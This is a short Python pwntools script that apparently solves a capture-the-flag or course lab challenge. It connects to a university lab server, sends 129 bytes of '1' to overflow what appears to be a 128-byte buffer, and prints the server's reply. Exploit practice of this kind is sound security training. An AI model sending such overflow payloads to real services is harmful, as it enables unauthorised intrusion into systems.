from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23151

s = remote(SERVER, PORT, timeout=9999)

s.recvline()
s.sendline(b'1'*129)
s.recvline()
response = s.recvline()

print(response.decode())
